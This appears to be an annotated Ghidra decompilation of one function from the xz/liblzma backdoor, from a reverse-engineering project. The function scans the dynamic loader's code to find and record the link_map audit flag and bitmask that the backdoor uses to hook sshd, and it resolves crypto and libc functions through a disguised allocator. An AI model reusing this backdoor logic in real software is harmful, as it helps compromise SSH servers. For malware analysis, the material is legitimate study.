// /home/kali/xzre-ghidra/xzregh/104AE0_find_link_map_l_audit_any_plt_bitmask.c
// Function: find_link_map_l_audit_any_plt_bitmask @ 0x104AE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_audit_any_plt_bitmask(backdoor_data_handle_t * data, instruction_search_ctx_t * search_ctx)


/*
 * AutoDoc: Scans `_dl_audit_symbind_alt` for the MOV/TEST sequence that inspects `link_map::l_audit_any_plt`.
 * It tracks which register held the computed displacement, validates that the test uses a single
 * set bit, and saves both the target address (relative to the libname offset) and the mask. Those
 * values are later used to toggle sshd/libcrypto into "audited" mode when the custom audit
 * interface is installed.
 */
#include "xzre_types.h"


BOOL find_link_map_l_audit_any_plt_bitmask
               (backdoor_data_handle_t *data,instruction_search_ctx_t *search_ctx)

{
  imported_funcs_t *piVar1;
  libc_imports_t *plVar2;
  u32 *puVar3;
  backdoor_hooks_data_t *pbVar4;
  undefined1 uVar5;
  BOOL BVar6;
  u32 uVar7;
  lzma_allocator *allocator;
  pfn_EVP_DecryptInit_ex_t ppVar8;
  lzma_allocator *allocator_00;
  pfn_getuid_t ppVar9;
  link_map *plVar10;
  undefined1 uVar11;
  byte bVar12;
  long lVar13;
  pfn_getuid_t *pppVar14;
  int iVar15;
  u8 *code_start;
  byte bVar16;
  u8 *code_ptr;
  pfn_EVP_DecryptInit_ex_t decrypt_stub;
  pfn_getuid_t libc_getuid_stub;
  u8 *matched_field;
  x86_prefix_state_t local_70;
  byte local_60;
  uint local_58;
  pfn_getuid_t local_50;
  ulong local_40;
  
  bVar16 = 0;
  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
  if (BVar6 != FALSE) {
    code_start = search_ctx->start_addr;
    pppVar14 = &libc_getuid_stub;
    for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
      *(undefined4 *)pppVar14 = 0;
      pppVar14 = (pfn_getuid_t *)((long)pppVar14 + (ulong)bVar16 * -8 + 4);
    }
    allocator = get_lzma_allocator();
    allocator->opaque = data->elf_handles->libcrypto;
    ppVar8 = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,allocator);
    piVar1 = search_ctx->imported_funcs;
    piVar1->EVP_DecryptInit_ex = ppVar8;
    if (ppVar8 != (pfn_EVP_DecryptInit_ex_t)0x0) {
      piVar1->resolved_imports_count = piVar1->resolved_imports_count + 1;
    }
    plVar2 = piVar1->libc;
    allocator_00 = get_lzma_allocator();
    allocator_00->opaque = data->elf_handles->libc;
    ppVar9 = (pfn_getuid_t)lzma_alloc(0x348,allocator_00);
    plVar2->getuid = ppVar9;
    if (ppVar9 != (pfn_getuid_t)0x0) {
      plVar2->resolved_imports_count = plVar2->resolved_imports_count + 1;
    }
    iVar15 = 0;
    bVar16 = 0xff;
    for (; code_start < search_ctx->end_addr; code_start = code_start + (long)matched_field) {
      BVar6 = x86_dasm((dasm_ctx_t *)&libc_getuid_stub,code_start,search_ctx->end_addr);
      if (BVar6 == FALSE) {
        return FALSE;
      }
      if (iVar15 == 0) {
        if (((local_58 == 0x1036) && (((ushort)local_70.flags_u16 & 0x140) == 0x140)) &&
           ((byte)(local_70.decoded.modrm.breakdown.modrm_mod - 1) < 2)) {
          uVar11 = 0;
          if ((local_70.flags_u16 & 0x40) == 0) {
            uVar5 = 0;
            if (((local_70.flags_u16 & 0x1040) != 0) &&
               (uVar5 = local_70.decoded.flags2 & 0x10, (local_70.flags_u16 & 0x1000) != 0)) {
              if ((local_70.flags_u16 & 0x20) == 0) {
                uVar11 = 0;
                uVar5 = local_60;
              }
              else {
                uVar5 = local_60 | ((byte)local_70.decoded.rex & 1) << 3;
              }
            }
          }
          else {
            uVar5 = local_70.decoded.flags & 0x20;
            if ((local_70.flags_u16 & 0x20) == 0) {
              uVar11 = local_70.decoded.modrm.breakdown.modrm_rm;
              if ((local_70.flags_u16 & 0x1040) != 0) {
                uVar5 = local_70.decoded.modrm.breakdown.modrm_reg;
              }
            }
            else {
              uVar11 = local_70.decoded.modrm.breakdown.modrm_rm | (char)local_70.decoded.rex * '\b' & 8U;
              uVar5 = 0;
              if ((local_70.flags_u16 & 0x1040) != 0) {
                uVar5 = local_70.decoded.modrm.breakdown.modrm_reg | (char)local_70.decoded.rex * '\x02' & 8U;
              }
            }
          }
          ppVar9 = (pfn_getuid_t)0x0;
          if (((local_70.flags_u16 & 0x100) != 0) &&
             (ppVar9 = local_50, ((uint)local_70.decoded.modrm & 0xff00ff00) == 0x5000000)) {
            ppVar9 = local_50 + (long)libc_getuid_stub + (long)matched_field;
          }
          if (((pfn_getuid_t)(ulong)*(uint *)&search_ctx->offset_to_match == ppVar9) &&
             (((int)(uint)*(ushort *)search_ctx->output_register >> (uVar11 & 0x1f) & 1U) != 0)) {
            *(undefined1 *)((long)search_ctx->output_register + 2) = uVar5;
            iVar15 = 1;
          }
        }
      }
      else if (iVar15 == 1) {
        if ((local_58 & 0xfffffffd) == 0x89) {
          puVar3 = search_ctx->output_register_to_match;
          uVar11 = local_70.decoded.flags & 0x40;
          if ((local_70.flags_u16 & 0x1040) == 0) {
            uVar5 = 0;
            if ((local_70.flags_u16 & 0x40) != 0) goto LAB_00104d83;
            if (*(char *)((long)puVar3 + 2) != '\0') goto LAB_00104e97;
            bVar12 = 0;
LAB_00104da0:
            if (search_ctx->output_register[2] != uVar11) goto LAB_00104da9;
          }
          else {
            if ((local_70.flags_u16 & 0x40) == 0) {
              if ((local_70.flags_u16 & 0x1000) == 0) {
                if (*(char *)((long)puVar3 + 2) == '\0') {
                  uVar5 = 0;
                  bVar12 = 0;
                  goto LAB_00104da0;
                }
                goto LAB_00104e97;
              }
              uVar5 = local_60;
              if ((local_70.flags_u16 & 0x20) != 0) {
                uVar5 = local_60 | ((byte)local_70.decoded.rex & 1) << 3;
              }
            }
            else {
              uVar5 = local_70.decoded.modrm.breakdown.modrm_reg;
              if ((local_70.flags_u16 & 0x20) != 0) {
                uVar5 = local_70.decoded.modrm.breakdown.modrm_reg | (char)local_70.decoded.rex * '\x02' & 8U;
              }
LAB_00104d83:
              uVar11 = local_70.decoded.modrm.breakdown.modrm_rm;
              if ((local_70.flags_u16 & 0x20) != 0) {
                uVar11 = local_70.decoded.modrm.breakdown.modrm_rm | ((byte)local_70.decoded.rex & 1) << 3;
              }
            }
            bVar12 = *(byte *)((long)puVar3 + 2);
            if (bVar12 == uVar5) goto LAB_00104da0;
LAB_00104da9:
            if ((uVar11 != bVar12) || (search_ctx->output_register[2] != uVar5)) goto LAB_00104e97;
          }
          iVar15 = 2;
          bVar16 = uVar11;
          if (local_58 != 0x89) {
            bVar16 = uVar5;
          }
        }
      }
      else if (iVar15 == 2) {
        if (local_58 == 0x128) {
          bVar12 = 0;
        }
        else {
          if ((local_58 != 0x176) || (local_70.decoded.modrm.breakdown.modrm_reg != 0)) goto LAB_00104e97;
          bVar12 = 0;
          if ((local_70.flags_u16 & 0x1040) != 0) {
            if ((local_70.flags_u16 & 0x40) == 0) {
              bVar12 = local_70.decoded.flags2 & 0x10;
              if (((local_70.flags_u16 & 0x1000) != 0) &&
                 (bVar12 = local_60, (local_70.flags_u16 & 0x20) != 0)) {
                bVar12 = local_60 | ((byte)local_70.decoded.rex & 1) << 3;
              }
            }
            else {
              bVar12 = local_70.decoded.flags & 0x20;
              if ((local_70.flags_u16 & 0x20) != 0) {
                bVar12 = (char)local_70.decoded.rex * '\x02' & 8;
              }
            }
          }
        }
        if (bVar16 == bVar12) {
          if ((local_40 < 0x100) && (uVar7 = count_bits(local_40), uVar7 == 1)) {
            pbVar4 = search_ctx->hooks;
            plVar10 = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
            (pbVar4->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = plVar10;
            (pbVar4->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_40;
            if ((plVar10->_opaque & local_40) == 0) {
              return TRUE;
            }
          }
          search_ctx->result = TRUE;
          return FALSE;
        }
      }
LAB_00104e97:
    }
    allocator->opaque = data->elf_handles->libcrypto;
    lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
    lzma_free(plVar2->getuid,allocator_00);
  }
  return FALSE;
}

